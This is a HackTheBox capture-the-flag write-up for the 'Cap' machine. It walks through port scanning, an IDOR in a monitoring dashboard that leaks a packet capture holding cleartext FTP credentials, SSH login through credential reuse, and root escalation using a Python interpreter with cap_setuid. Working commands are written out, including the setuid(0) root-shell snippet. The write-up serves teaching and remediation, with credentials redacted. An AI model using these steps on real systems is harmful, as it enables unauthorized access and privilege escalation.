# Cap

This HackTheBox lab demonstrates how an insecure direct object reference (IDOR) in a network-monitoring dashboard can expose historical packet captures, reveal cleartext FTP credentials, and lead to full host compromise when a Python interpreter has the Linux `cap_setuid` capability.

## Lab Summary

| Item | Detail |
| --- | --- |
| Platform | HackTheBox |
| Machine | Cap |
| Target | `10.129.22.111` |
| Operating System | Ubuntu 20.04.2 LTS |
| Initial Vector | IDOR in the Security Snapshot archive |
| Initial Access | Recovered credentials reused for SSH as `nathan` |
| Privilege Escalation | Python 3.8 with `cap_setuid` capability |
| Evidence Source | `pentest_trace` JSON export |
| Testing Date | 2026-09-26 |

## Evidence Handling

The source trace contained a live lab password and user/root proof values. These values are replaced with `<REDACTED>` because they are unnecessary for explaining the attack path. The exact snapshot identifier and packet-capture download URL were not retained, so this writeup describes only the confirmed behavior.

## Reconnaissance

I used RustScan with Nmap default scripts and service detection:

```bash
target=10.129.22.111
rustscan --ulimit 5000 -a $target -- -sC -sV
```

The target exposed three TCP services:

```text
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2
80/tcp open  http    Gunicorn
```

The web server presented a **Security Dashboard**. FTP and SSH were also important because any credentials recovered from the application could potentially be tested against those services.

## Web Enumeration

I enumerated common paths with Gobuster:

```bash
gobuster dir -u "http://$target/" \
  -w /usr/share/wordlists/dirb/common.txt \
  -t 64
```

Relevant results were:

```text
/data      302
/ip        200
/netstat   200
```

The dashboard displayed host and network information. Its **Security Snapshot** feature generated a short packet capture and linked to a result whose URL contained a numeric identifier.

## IDOR in Security Snapshot Archives

Changing the numeric identifier in the snapshot URL returned another capture without verifying that the requester was authorized to access it. This was an insecure direct object reference: the server used a client-controlled object identifier but did not enforce an access-control check for the referenced capture.

I downloaded the exposed PCAP file and reviewed it in Wireshark. Filtering for FTP control traffic revealed an earlier authentication exchange:

```text
USER nathan
PASS <REDACTED>
230 Login successful.
```

FTP transmits usernames and passwords without encryption. Because the application exposed a packet capture containing this traffic, the IDOR directly disclosed a valid credential pair.

## Initial Access

I tested the recovered credential against SSH:

```bash
ssh nathan@$target
```

Authentication succeeded and returned an interactive shell as `nathan`:

```text
nathan@cap:~$ whoami
nathan
```

The user proof was present in Nathan's home directory:

```bash
cat ~/user.txt
```

```text
<REDACTED>
```

## Local Enumeration

I hosted LinPEAS from the attacking machine:

```bash
python3 -m http.server 8080
```

The target successfully requested the script from `10.10.14.186:8080`. The source trace retained the transfer evidence and the resulting LinPEAS output, but not the exact command used to save and execute the script.

The most important result was an unusual capability assigned to the system Python interpreter:

```text
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

Linux capabilities split selected root privileges into smaller units. `cap_setuid` allows a process to change its user ID. Assigning it to a general-purpose interpreter is dangerous because any user who can execute that interpreter can call `setuid(0)` and become root.

## Privilege Escalation

I launched the capability-enabled interpreter and changed the process UID to `0`:

```bash
/usr/bin/python3.8
```

```python
import os
os.setuid(0)
os.system("/bin/bash")
```

The new shell ran as root:

```text
root@cap:/usr/bin# whoami
root
```

The root proof was stored in `/root/root.txt`:

```bash
cat /root/root.txt
```

```text
<REDACTED>
```

## Attack Path

```text
RustScan and Nmap
        |
        v
FTP, SSH, and the Gunicorn dashboard identified
        |
        v
/data Security Snapshot archive discovered
        |
        v
Numeric snapshot identifier modified
        |
        v
Historical PCAP downloaded through IDOR
        |
        v
Cleartext FTP credentials recovered in Wireshark
        |
        v
Credential reuse provides SSH access as nathan
        |
        v
LinPEAS identifies cap_setuid on /usr/bin/python3.8
        |
        v
Python calls setuid(0) and launches /bin/bash
        |
        v
Root shell
```

## Root Cause

The compromise depended on three weaknesses that amplified one another:

- The snapshot archive did not enforce object-level authorization.
- FTP authentication traffic crossed the network in cleartext and was retained in an accessible PCAP.
- A reusable credential was accepted by SSH.
- A general-purpose Python interpreter had the privileged `cap_setuid` capability.

## Remediation

- Enforce server-side authorization for every packet-capture object and use non-predictable identifiers as defense in depth.
- Restrict packet captures to authorized administrators, apply short retention periods, and remove or mask authentication material before storage.
- Replace FTP with SFTP or another encrypted transfer protocol.
- Rotate the exposed credential and prohibit credential reuse across services.
- Remove unnecessary capabilities from Python with `setcap -r /usr/bin/python3.8` and audit the host with `getcap -r / 2>/dev/null`.
- Permit privileged operations only through narrowly scoped, reviewed binaries or controlled `sudo` rules.
- Monitor access to capture archives, cleartext authentication protocols, unusual SSH logins, and changes to file capabilities.

## Lessons Learned

- Data generated by a diagnostic feature can be more sensitive than the application page that exposes it.
- IDOR testing should include historical records, exported files, reports, and capture identifiers—not only user profiles.
- PCAP analysis should check cleartext protocols early because credentials may be visible without decryption.
- Linux capabilities belong in every privilege-escalation checklist; `cap_setuid` on an interpreter is effectively a direct path to root.
- Recording commands and evidence in structured JSON makes it much easier to reconstruct a complete attack chain and produce a defensible report.

## Evidence Limitations

- The exact snapshot identifier and PCAP download URL were not retained.
- The exact LinPEAS save and execution commands were not retained, although the transfer and capability output were captured.
- The source trace did not record whether the recovered password was intentionally shared between FTP and SSH or reused through a common authentication backend.

## Related Report

- [Cap Penetration Test Report](../../../reports/hackthebox/cap-pentest-report.md)

## Disclaimer

This writeup documents activity performed in an authorized HackTheBox lab environment for educational purposes.
